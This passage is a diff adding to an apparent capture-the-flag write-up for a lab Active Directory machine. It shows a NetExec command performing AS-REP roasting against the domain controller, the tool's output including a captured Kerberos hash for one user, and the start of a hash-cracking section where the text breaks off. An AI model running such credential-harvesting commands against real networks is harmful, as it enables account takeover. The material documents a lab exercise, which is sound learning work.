@@ -169,3 +169,14 @@ Found all the users, from here i can use this to generate a user list
 
 With the users file i can perform something like AS-REP roasting
 
+# AS-REP roasting
+```python
+nxc ldap dc01.rebound.htb -u users.txt -p '' --asreproast asrep.hash
+LDAP        10.129.14.17    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb) (signing:Enforced) (channel binding:Always)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+LDAP        10.129.14.17    389    DC01             $krb5asrep$23$jjones@REBOUND.HTB:0551ef0d6dbd461030bc230450267059$004a8353e9f2bcec2d8e66a34ade019a4660c9aaea16c75d70b90d4f3fe9793157b3b5ad344c34d0a1be85ad13414bd828f153567f82bde50da10b4904c51b9e8f32f2231174db41856fac773cc151f74c2c8b293ecc005ad2672938c413acf640b55f978dc1b5138f97aeec08fa9f60c30e6a03d93bcdc253f7254cbc0e0bbc75bb79ef3819c6b8d38608b09cf1d9b95ae69fba2351a309b1911f080fbeda95370e37382391313c7659c29a6309a70c888fc915413a5f7a7704b873b5930d5b8cfa3ac2358b7465ed400bfd7104ab66f203b86a72e6a8d5e6cb1ef4d9519b7b589f686ff1c2f9e603c2
+```
+I have found a hash!
+
+## Cracking the hash
+T
